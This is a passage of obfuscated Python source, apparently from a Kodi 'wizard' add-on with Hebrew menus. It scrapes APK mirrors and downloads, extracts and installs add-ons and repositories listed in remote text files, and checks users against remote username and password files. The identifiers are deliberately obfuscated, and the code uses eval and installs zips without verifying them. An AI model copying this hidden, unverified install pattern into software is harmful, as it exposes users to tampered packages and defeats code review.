		addFile ("[B]%s[/B]"%O0O0O0O0O00OOOOO0 ,'',themeit =THEME3 )#line:2036
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2037
		if OO00OO0OOO00OOO00 :#line:2038
			for O0O0O0O0O00OOOOO0 ,O00000OO00OO00OOO ,OOO00O00OOO00OOOO ,O00OOOOOOO0OO0O00 ,O0OOO00OOO000O0OO ,OOO00000O0000000O ,OOO000O00O0000OO0 ,O0OOO0O000OO0OOO0 in O0000OO0OOO0OO0O0 :#line:2039
				if not SHOWADULT =='true'and OOO000O00O0000OO0 .lower ()=='yes':continue #line:2040
				addFile ("[%s] %s v%s"%(O00OOOOOOO0OO0O00 ,O0O0O0O0O00OOOOO0 ,O00000OO00OO00OOO ),'installthird',O0O0O0O0O00OOOOO0 ,OOO00O00OOO00OOOO ,icon =O0OOO00OOO000O0OO ,fanart =OOO00000O0000000O ,description =O0OOO0O000OO0OOO0 ,themeit =THEME2 )#line:2041
		else :#line:2042
			for O0O0O0O0O00OOOOO0 ,OOO00O00OOO00OOOO ,O0OOO00OOO000O0OO ,OOO00000O0000000O ,O0OOO0O000OO0OOO0 in O0000OO0OOO0OO0O0 :#line:2043
				addFile (O0O0O0O0O00OOOOO0 ,'installthird',O0O0O0O0O00OOOOO0 ,OOO00O00OOO00OOOO ,icon =O0OOO00OOO000O0OO ,fanart =OOO00000O0000000O ,description =O0OOO0O000OO0OOO0 ,themeit =THEME2 )#line:2044
def editThirdParty (OO0O000O000O0O00O ):#line:2046
	OO0000O0OOO0000O0 =eval ('THIRD%sNAME'%OO0O000O000O0O00O )#line:2047
	O000O000O0OOOO00O =eval ('THIRD%sURL'%OO0O000O000O0O00O )#line:2048
	O0OOOOOOO00O0OO0O =wiz .getKeyboard (OO0000O0OOO0000O0 ,'Enter the Name of the Wizard')#line:2049
	O0OO00OO0OO00OO00 =wiz .getKeyboard (O000O000O0OOOO00O ,'Enter the URL of the Wizard Text')#line:2050
	wiz .setS ('wizard%sname'%OO0O000O000O0O00O ,O0OOOOOOO00O0OO0O )#line:2052
	wiz .setS ('wizard%surl'%OO0O000O000O0O00O ,O0OO00OO0OO00OO00 )#line:2053
def apkScraper (name =""):#line:2055
	if name =='kodi':#line:2056
		OO0O0O000OOOOOOOO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2057
		O0OO000O00O0OOOO0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2058
		OOO00OOO0OOOOOOOO =wiz .openURL (OO0O0O000OOOOOOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2059
		O000O0O00O0O00000 =wiz .openURL (O0OO000O00O0OOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2060
		O000OOO000O0OOO0O =0 #line:2061
		OOOOO000OOO0O00OO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOO00OOO0OOOOOOOO )#line:2062
		OOO000O00OOOO0O0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000O0O00O0O00000 )#line:2063
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2065
		O00000OO0OO00O00O =False #line:2066
		for OO0OOO00O0000O0OO ,name ,O00O00OOOOOOO0OOO ,O000O00O0OO0O0OO0 in OOOOO000OOO0O00OO :#line:2067
			if OO0OOO00O0000O0OO in ['../','old/']:continue #line:2068
			if not OO0OOO00O0000O0OO .endswith ('.apk'):continue #line:2069
			if not OO0OOO00O0000O0OO .find ('_')==-1 and O00000OO0OO00O00O ==True :continue #line:2070
			try :#line:2071
				OOOO0O00O000OO0O0 =name .split ('-')#line:2072
				if not OO0OOO00O0000O0OO .find ('_')==-1 :#line:2073
					O00000OO0OO00O00O =True #line:2074
					OO000OOOO00O000OO ,O00O0OOO0000O00OO =OOOO0O00O000OO0O0 [2 ].split ('_')#line:2075
				else :#line:2076
					OO000OOOO00O000OO =OOOO0O00O000OO0O0 [2 ]#line:2077
					O00O0OOO0000O00OO =''#line:2078
				O0O00OOOO0O0OO0O0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0O00O000OO0O0 [0 ].title (),OOOO0O00O000OO0O0 [1 ],O00O0OOO0000O00OO .upper (),OO000OOOO00O000OO ,COLOR2 ,O00O00OOOOOOO0OOO .replace (' ',''),COLOR1 ,O000O00O0OO0O0OO0 )#line:2079
				OO000O00OO00O0000 =urljoin (OO0O0O000OOOOOOOO ,OO0OOO00O0000O0OO )#line:2080
				addFile (O0O00OOOO0O0OO0O0 ,'apkinstall',"%s v%s%s %s"%(OOOO0O00O000OO0O0 [0 ].title (),OOOO0O00O000OO0O0 [1 ],O00O0OOO0000O00OO .upper (),OO000OOOO00O000OO ),OO000O00OO00O0000 )#line:2081
				O000OOO000O0OOO0O +=1 #line:2082
			except :#line:2083
				wiz .log ("Error on: %s"%name )#line:2084
		for OO0OOO00O0000O0OO ,name ,O00O00OOOOOOO0OOO ,O000O00O0OO0O0OO0 in OOO000O00OOOO0O0O :#line:2086
			if OO0OOO00O0000O0OO in ['../','old/']:continue #line:2087
			if not OO0OOO00O0000O0OO .endswith ('.apk'):continue #line:2088
			if not OO0OOO00O0000O0OO .find ('_')==-1 :continue #line:2089
			try :#line:2090
				OOOO0O00O000OO0O0 =name .split ('-')#line:2091
				O0O00OOOO0O0OO0O0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0O00O000OO0O0 [0 ].title (),OOOO0O00O000OO0O0 [1 ],OOOO0O00O000OO0O0 [2 ],COLOR2 ,O00O00OOOOOOO0OOO .replace (' ',''),COLOR1 ,O000O00O0OO0O0OO0 )#line:2092
				OO000O00OO00O0000 =urljoin (O0OO000O00O0OOOO0 ,OO0OOO00O0000O0OO )#line:2093
				addFile (O0O00OOOO0O0OO0O0 ,'apkinstall',"%s v%s %s"%(OOOO0O00O000OO0O0 [0 ].title (),OOOO0O00O000OO0O0 [1 ],OOOO0O00O000OO0O0 [2 ]),OO000O00OO00O0000 )#line:2094
				O000OOO000O0OOO0O +=1 #line:2095
			except :#line:2096
				wiz .log ("Error on: %s"%name )#line:2097
		if O000OOO000O0OOO0O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2098
	elif name =='spmc':#line:2099
		OO00OOO00O0OOO00O ='https://github.com/koying/SPMC/releases'#line:2100
		OOO00OOO0OOOOOOOO =wiz .openURL (OO00OOO00O0OOO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2101
		O000OOO000O0OOO0O =0 #line:2102
		OOOOO000OOO0O00OO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OOO00OOO0OOOOOOOO )#line:2103
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2105
		for name ,O000O000O000O000O in OOOOO000OOO0O00OO :#line:2107
			O0O0OOOO0OO000OO0 =''#line:2108
			OOO000O00OOOO0O0O =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O000O000O000O000O )#line:2109
			for OOO0OO0OOOOOOO0O0 ,O00O0OO0OOOO0000O ,O000OOOO0OO0O0O0O in OOO000O00OOOO0O0O :#line:2110
				if O000OOOO0OO0O0O0O .find ('armeabi')==-1 :continue #line:2111
				if O000OOOO0OO0O0O0O .find ('launcher')>-1 :continue #line:2112
				O0O0OOOO0OO000OO0 =urljoin ('https://github.com',OOO0OO0OOOOOOO0O0 )#line:2113
				break #line:2114
		if O000OOO000O0OOO0O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2116
def apkMenu (url =None ):#line:2118
	if url ==None :#line:2119
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2122
	if not APKFILE =='http://':#line:2123
		if url ==None :#line:2124
			OO0O0OO0O0O00OOOO =wiz .workingURL (APKFILE )#line:2125
			OO00OOO00O000O000 =uservar .APKFILE #line:2126
		else :#line:2127
			OO0O0OO0O0O00OOOO =wiz .workingURL (url )#line:2128
			OO00OOO00O000O000 =url #line:2129
		if OO0O0OO0O0O00OOOO ==True :#line:2130
			O0O00OO0O0O00O0OO =wiz .openURL (OO00OOO00O000O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2131
			O000OOOO000O0O000 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O00OO0O0O00O0OO )#line:2132
			if len (O000OOOO000O0O000 )>0 :#line:2133
				O0O0OO00000OOO000 =0 #line:2134
				for OO00O0OOOO0O0O000 ,O0O00O0O0OOO00OOO ,url ,O00O000OO000O00O0 ,O0O00OO0O0O00000O ,OOO00OOOO0OO0OO00 ,OO0OO000OOOO0O0O0 in O000OOOO000O0O000 :#line:2135
					if not SHOWADULT =='true'and OOO00OOOO0OO0OO00 .lower ()=='yes':continue #line:2136
					if O0O00O0O0OOO00OOO .lower ()=='yes':#line:2137
						O0O0OO00000OOO000 +=1 #line:2138
						addDir ("[B]%s[/B]"%OO00O0OOOO0O0O000 ,'apk',url ,description =OO0OO000OOOO0O0O0 ,icon =O00O000OO000O00O0 ,fanart =O0O00OO0O0O00000O ,themeit =THEME3 )#line:2139
					else :#line:2140
						O0O0OO00000OOO000 +=1 #line:2141
						addFile (OO00O0OOOO0O0O000 ,'apkinstall',OO00O0OOOO0O0O000 ,url ,description =OO0OO000OOOO0O0O0 ,icon =O00O000OO000O00O0 ,fanart =O0O00OO0O0O00000O ,themeit =THEME2 )#line:2142
					if O0O0OO00000OOO000 <1 :#line:2143
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2144
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2145
		else :#line:2146
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2147
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2148
			addFile ('%s'%OO0O0OO0O0O00OOOO ,'',themeit =THEME3 )#line:2149
		return #line:2150
	else :wiz .log ("[APK Menu] No APK list added.")#line:2151
	setView ('files','viewType')#line:2152
def addonMenu (url =None ):#line:2154
	if not ADDONFILE =='http://':#line:2155
		if url ==None :#line:2156
			O000O00O0O0OO00OO =wiz .workingURL (ADDONFILE )#line:2157
			O00000OOOOO00O00O =uservar .ADDONFILE #line:2158
		else :#line:2159
			O000O00O0O0OO00OO =wiz .workingURL (url )#line:2160
			O00000OOOOO00O00O =url #line:2161
		if O000O00O0O0OO00OO ==True :#line:2162
			OOO0O00O000OO0O0O =wiz .openURL (O00000OOOOO00O00O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2163
			O0000000OOOOO0O0O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO0O00O000OO0O0O )#line:2164
			if len (O0000000OOOOO0O0O )>0 :#line:2165
				O0OO0000OOOO0000O =0 #line:2166
				for OO000000O0OO0OO0O ,OOO0OO00O000O0OOO ,url ,O000000O0O0OO0000 ,OO000OOOO0O0OOO0O ,O0OO0O0OOOOO00OO0 ,OOO0OOO0000O0O0O0 ,O000O0OOOOOO00O00 ,OO0000OO0O00O000O ,O000O00OO00O0O000 in O0000000OOOOO0O0O :#line:2167
					if OOO0OO00O000O0OOO .lower ()=='section':#line:2168
						O0OO0000OOOO0000O +=1 #line:2169
						addDir ("[B]%s[/B]"%OO000000O0OO0OO0O ,'addons',url ,description =O000O00OO00O0O000 ,icon =OOO0OOO0000O0O0O0 ,fanart =O000O0OOOOOO00O00 ,themeit =THEME3 )#line:2170
					else :#line:2171
						if not SHOWADULT =='true'and OO0000OO0O00O000O .lower ()=='yes':continue #line:2172
						try :#line:2173
							OOO00OOO0O000OO00 =xbmcaddon .Addon (id =OOO0OO00O000O0OOO ).getAddonInfo ('path')#line:2174
							if os .path .exists (OOO00OOO0O000OO00 ):#line:2175
								OO000000O0OO0OO0O ="[COLOR green][Installed][/COLOR] %s"%OO000000O0OO0OO0O #line:2176
						except :#line:2177
							pass #line:2178
						O0OO0000OOOO0000O +=1 #line:2179
						addFile (OO000000O0OO0OO0O ,'addoninstall',OOO0OO00O000O0OOO ,O00000OOOOO00O00O ,description =O000O00OO00O0O000 ,icon =OOO0OOO0000O0O0O0 ,fanart =O000O0OOOOOO00O00 ,themeit =THEME2 )#line:2180
					if O0OO0000OOOO0000O <1 :#line:2181
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2182
			else :#line:2183
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2184
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2185
		else :#line:2186
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2187
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2188
			addFile ('%s'%O000O00O0O0OO00OO ,'',themeit =THEME3 )#line:2189
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2190
	setView ('files','viewType')#line:2191
def addonInstaller (O00000OOO0O0O000O ,O0000OO0O0O0O0000 ):#line:2193
	if not ADDONFILE =='http://':#line:2194
		OO0OOOOO000OO0O00 =wiz .workingURL (O0000OO0O0O0O0000 )#line:2195
		if OO0OOOOO000OO0O00 ==True :#line:2196
			O00000O0O0O0OOO00 =wiz .openURL (O0000OO0O0O0O0000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2197
			OO0O0000O00OO00O0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00000OOO0O0O000O ).findall (O00000O0O0O0OOO00 )#line:2198
			if len (OO0O0000O00OO00O0 )>0 :#line:2199
				for O0O00O0OOO000OOO0 ,O0000OO0O0O0O0000 ,OOOO0OO0OOO00O0O0 ,OO00O00O0O00O0OOO ,O00O0OO0OO0OOOO0O ,OO00O00O000O0OO0O ,OOOO0O0O00OOO0000 ,OOO00000O000O0OO0 ,O0O00O0OO0O000OOO in OO0O0000O00OO00O0 :#line:2200
					if os .path .exists (os .path .join (ADDONS ,O00000OOO0O0O000O )):#line:2201
						O00OO0O00000OO00O =['Launch Addon','Remove Addon']#line:2202
						O0OOO0OO000OOOO0O =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O00OO0O00000OO00O )#line:2203
						if O0OOO0OO000OOOO0O ==0 :#line:2204
							wiz .ebi ('RunAddon(%s)'%O00000OOO0O0O000O )#line:2205
							xbmc .sleep (1000 )#line:2206
							return True #line:2207
						elif O0OOO0OO000OOOO0O ==1 :#line:2208
							wiz .cleanHouse (os .path .join (ADDONS ,O00000OOO0O0O000O ))#line:2209
							try :wiz .removeFolder (os .path .join (ADDONS ,O00000OOO0O0O000O ))#line:2210
							except :pass #line:2211
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00000OOO0O0O000O ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2212
								removeAddonData (O00000OOO0O0O000O )#line:2213
							wiz .refresh ()#line:2214
							return True #line:2215
						else :#line:2216
							return False #line:2217
					O0O0OO0OO000O000O =os .path .join (ADDONS ,OOOO0OO0OOO00O0O0 )#line:2218
					if not OOOO0OO0OOO00O0O0 .lower ()=='none'and not os .path .exists (O0O0OO0OO000O000O ):#line:2219
						wiz .log ("Repository not installed, installing it")#line:2220
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O00000OOO0O0O000O ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOO0OO0OOO00O0O0 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2221
							O0OOO0O0OO00OOOO0 =wiz .parseDOM (wiz .openURL (OO00O00O0O00O0OOO ),'addon',ret ='version',attrs ={'id':OOOO0OO0OOO00O0O0 })#line:2222
							if len (O0OOO0O0OO00OOOO0 )>0 :#line:2223
								OO00OO0O0000OOOOO ='%s%s-%s.zip'%(O00O0OO0OO0OOOO0O ,OOOO0OO0OOO00O0O0 ,O0OOO0O0OO00OOOO0 [0 ])#line:2224
								wiz .log (OO00OO0O0000OOOOO )#line:2225
								if KODIV >=17 :wiz .addonDatabase (OOOO0OO0OOO00O0O0 ,1 )#line:2226
								installAddon (OOOO0OO0OOO00O0O0 ,OO00OO0O0000OOOOO )#line:2227
								wiz .ebi ('UpdateAddonRepos()')#line:2228
								wiz .log ("Installing Addon from Kodi")#line:2230
								O0O0O0OOO0O0O000O =installFromKodi (O00000OOO0O0O000O )#line:2231
								wiz .log ("Install from Kodi: %s"%O0O0O0OOO0O0O000O )#line:2232
								if O0O0O0OOO0O0O000O :#line:2233
									wiz .refresh ()#line:2234
									return True #line:2235
							else :#line:2236
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOOO0OO0OOO00O0O0 )#line:2237
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O00000OOO0O0O000O ,OOOO0OO0OOO00O0O0 ))#line:2238
					elif OOOO0OO0OOO00O0O0 .lower ()=='none':#line:2239
						wiz .log ("No repository, installing addon")#line:2240
						OO0OOOO0O0OOO0O0O =O00000OOO0O0O000O #line:2241
						OO0OOOO0OO000OO00 =O0000OO0O0O0O0000 #line:2242
						installAddon (O00000OOO0O0O000O ,O0000OO0O0O0O0000 )#line:2243
						wiz .refresh ()#line:2244
						return True #line:2245
					else :#line:2246
						wiz .log ("Repository installed, installing addon")#line:2247
						O0O0O0OOO0O0O000O =installFromKodi (O00000OOO0O0O000O ,False )#line:2248
						if O0O0O0OOO0O0O000O :#line:2249
							wiz .refresh ()#line:2250
							return True #line:2251
					if os .path .exists (os .path .join (ADDONS ,O00000OOO0O0O000O )):return True #line:2252
					OO000O0O0O000OO00 =wiz .parseDOM (wiz .openURL (OO00O00O0O00O0OOO ),'addon',ret ='version',attrs ={'id':O00000OOO0O0O000O })#line:2253
					if len (OO000O0O0O000OO00 )>0 :#line:2254
						O0000OO0O0O0O0000 ="%s%s-%s.zip"%(O0000OO0O0O0O0000 ,O00000OOO0O0O000O ,OO000O0O0O000OO00 [0 ])#line:2255
						wiz .log (str (O0000OO0O0O0O0000 ))#line:2256
						if KODIV >=17 :wiz .addonDatabase (O00000OOO0O0O000O ,1 )#line:2257
						installAddon (O00000OOO0O0O000O ,O0000OO0O0O0O0000 )#line:2258
						wiz .refresh ()#line:2259
					else :#line:2260
						wiz .log ("no match");return False #line:2261
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2262
		else :wiz .log ("[Addon Installer] Text File: %s"%OO0OOOOO000OO0O00 )#line:2263
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2264
def installFromKodi (O0O0O0O0000OO00OO ,over =True ):#line:2266
	if over ==True :#line:2267
		xbmc .sleep (2000 )#line:2268
	wiz .ebi ('RunPlugin(plugin://%s)'%O0O0O0O0000OO00OO )#line:2270
	if not wiz .whileWindow ('yesnodialog'):#line:2271
		return False #line:2272
	xbmc .sleep (1000 )#line:2273
	if wiz .whileWindow ('okdialog'):#line:2274
		return False #line:2275
	wiz .whileWindow ('progressdialog')#line:2276
	if os .path .exists (os .path .join (ADDONS ,O0O0O0O0000OO00OO )):return True #line:2277
	else :return False #line:2278
def installAddon (OO000O0OOO00OO0O0 ,O000OO0O000OOOO0O ):#line:2280
	if not wiz .workingURL (O000OO0O000OOOO0O )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO000O0OOO00OO0O0 ,COLOR2 ));return #line:2281
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2282
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O0OOO00OO0O0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2283
	O00OOOO0OO0OOOOO0 =O000OO0O000OOOO0O .split ('/')#line:2284
	O0OO00O000OOO00O0 =os .path .join (PACKAGES ,O00OOOO0OO0OOOOO0 [-1 ])#line:2285
	try :os .remove (O0OO00O000OOO00O0 )#line:2286
	except :pass #line:2287
	downloader .download (O000OO0O000OOOO0O ,O0OO00O000OOO00O0 ,DP )#line:2288
	OOOO0OOO00O0OOO0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O0OOO00OO0O0 )#line:2289
	DP .update (0 ,OOOO0OOO00O0OOO0O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2290
	OOO0000O0OOO00OOO ,O0OOOOO00OOOOO000 ,OO00O0O00OO0OOOOO =extract .all (O0OO00O000OOO00O0 ,ADDONS ,DP ,title =OOOO0OOO00O0OOO0O )#line:2291
	DP .update (0 ,OOOO0OOO00O0OOO0O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2292
	installed (OO000O0OOO00OO0O0 )#line:2293
	installDep (OO000O0OOO00OO0O0 ,DP )#line:2294
	DP .close ()#line:2295
	wiz .ebi ('UpdateAddonRepos()')#line:2296
	wiz .ebi ('UpdateLocalAddons()')#line:2297
	wiz .refresh ()#line:2298
def installDep (O000OO0OO00OO0O0O ,DP =None ):#line:2300
	OO00OOO0O0OO0OOOO =os .path .join (ADDONS ,O000OO0OO00OO0O0O ,'addon.xml')#line:2301
	if os .path .exists (OO00OOO0O0OO0OOOO ):#line:2302
		OOOO00OOOO00OOO00 =open (OO00OOO0O0OO0OOOO ,mode ='r');O00000O0O00O00O00 =OOOO00OOOO00OOO00 .read ();OOOO00OOOO00OOO00 .close ();#line:2303
		OOOOOOOOOOOOO0000 =wiz .parseDOM (O00000O0O00O00O00 ,'import',ret ='addon')#line:2304
		for O00O000O0OO0O0OOO in OOOOOOOOOOOOO0000 :#line:2305
			if not 'xbmc.python'in O00O000O0OO0O0OOO :#line:2306
				if not DP ==None :#line:2307
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O000O0OO0O0OOO ))#line:2308
				wiz .createTemp (O00O000O0OO0O0OOO )#line:2309
def installed (OOO00000OO00000OO ):#line:2336
	OOOOO0OOO00OO00OO =os .path .join (ADDONS ,OOO00000OO00000OO ,'addon.xml')#line:2337
	if os .path .exists (OOOOO0OOO00OO00OO ):#line:2338
		try :#line:2339
			O0OO0OOOOO0OO0OOO =open (OOOOO0OOO00OO00OO ,mode ='r');O0000O0O00O0O0000 =O0OO0OOOOO0OO0OOO .read ();O0OO0OOOOO0OO0OOO .close ()#line:2340
			O000OO00O0O00O000 =wiz .parseDOM (O0000O0O00O0O0000 ,'addon',ret ='name',attrs ={'id':OOO00000OO00000OO })#line:2341
			OO0O0OO0OOOO00OO0 =os .path .join (ADDONS ,OOO00000OO00000OO ,'icon.png')#line:2342
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O000OO00O0O00O000 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO0O0OO0OOOO00OO0 )#line:2343
		except :pass #line:2344
def youtubeMenu (url =None ):#line:2346
	if not YOUTUBEFILE =='http://':#line:2347
		if url ==None :#line:2348
			OOOOOO000OOO0O0OO =wiz .workingURL (YOUTUBEFILE )#line:2349
			OO000O0000OO00O0O =uservar .YOUTUBEFILE #line:2350
		else :#line:2351
			OOOOOO000OOO0O0OO =wiz .workingURL (url )#line:2352
			OO000O0000OO00O0O =url #line:2353
		if OOOOOO000OOO0O0OO ==True :#line:2354
			OO0OO0OOO0OO0000O =wiz .openURL (OO000O0000OO00O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2355
			OO0O0OOO000O00000 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0OO0OOO0OO0000O )#line:2356
			if len (OO0O0OOO000O00000 )>0 :#line:2357
				for OO0OO000OOO0O0O00 ,OOOOOOO00000O0O0O ,url ,O00000OOOOOO0OO0O ,OOO0OOOOO0O0O0OO0 ,OO000O0OO0O00O00O in OO0O0OOO000O00000 :#line:2358
					if OOOOOOO00000O0O0O .lower ()=="yes":#line:2359
						addDir ("[B]%s[/B]"%OO0OO000OOO0O0O00 ,'youtube',url ,description =OO000O0OO0O00O00O ,icon =O00000OOOOOO0OO0O ,fanart =OOO0OOOOO0O0O0OO0 ,themeit =THEME3 )#line:2360
					else :#line:2361
						addFile (OO0OO000OOO0O0O00 ,'viewVideo',url =url ,description =OO000O0OO0O00O00O ,icon =O00000OOOOOO0OO0O ,fanart =OOO0OOOOO0O0O0OO0 ,themeit =THEME2 )#line:2362
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2363
		else :#line:2364
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2365
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2366
			addFile ('%s'%OOOOOO000OOO0O0OO ,'',themeit =THEME3 )#line:2367
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2368
	setView ('files','viewType')#line:2369
def STARTP ():#line:2370
	O0000O0O0OO00OOO0 =(ADDON .getSetting ("pass"))#line:2371
	if BUILDNAME =="":#line:2372
	 if not NOTIFY =='true':#line:2373
          O0OO0OO0OO0000O00 =wiz .workingURL (NOTIFICATION )#line:2374
	 if not NOTIFY2 =='true':#line:2375
          O0OO0OO0OO0000O00 =wiz .workingURL (NOTIFICATION2 )#line:2376
	 if not NOTIFY3 =='true':#line:2377
          O0OO0OO0OO0000O00 =wiz .workingURL (NOTIFICATION3 )#line:2378
	OOO000OO0O00O0OOO =O0000O0O0OO00OOO0 #line:2379
	O0OO0OO0OO0000O00 =urllib2 .Request (SPEED )#line:2380
	OOOO0000OOOO0O0OO =urllib2 .urlopen (O0OO0OO0OO0000O00 )#line:2381
	O0OO0000O00OO00OO =OOOO0000OOOO0O0OO .read ()#line:2382
	if O0000O0O0OO00OOO0 ==OOO000OO0O00O0OOO :#line:2383
				O0OO0OO0OO0000O00 =list #line:2384
				if OOO000OO0O00O0OOO !=O0OO0000O00OO00OO :#line:2385
					OOOO0000O00OOO0OO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2386
					if OOOO0000O00OOO0OO :#line:2388
						ADDON .openSettings ()#line:2390
						STARTP ()#line:2391
						sys .exit ()#line:2392
					else :#line:2393
						sys .exit ()#line:2394
	return 'ok'#line:2398
def STARTP2 ():#line:2399
	OOO0OO0OO0OO0O00O =(ADDON .getSetting ("user"))#line:2400
	OO00OOO000O000000 =(UNAME )#line:2402
	OO00O0O0OO0OOO00O =urllib2 .urlopen (OO00OOO000O000000 )#line:2403
	OOOOOOOO00OOOOOO0 =OO00O0O0OO0OOO00O .readlines ()#line:2404
	OOO0O0OO00000O0OO =0 #line:2405
	for O0O000OO0O0O0OO0O in OOOOOOOO00OOOOOO0 :#line:2408
		if O0O000OO0O0O0OO0O .split (' ==')[0 ]==OOO0OO0OO0OO0O00O or O0O000OO0O0O0OO0O .split ()[0 ]==OOO0OO0OO0OO0O00O :#line:2409
			OOO0O0OO00000O0OO =1 #line:2410
			break #line:2411
	if OOO0O0OO00000O0OO ==0 :#line:2412
		O0OO0000O00O0OO00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2413
		if O0OO0000O00O0OO00 :#line:2415
			ADDON .openSettings ()#line:2417
			STARTP2 ()#line:2419
			sys .exit ()#line:2420
		else :#line:2421
			sys .exit ()#line:2422
	return 'ok'#line:2426
def passandpin ():#line:2427
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2428
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2429
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2430
def passandUsername ():#line:2431
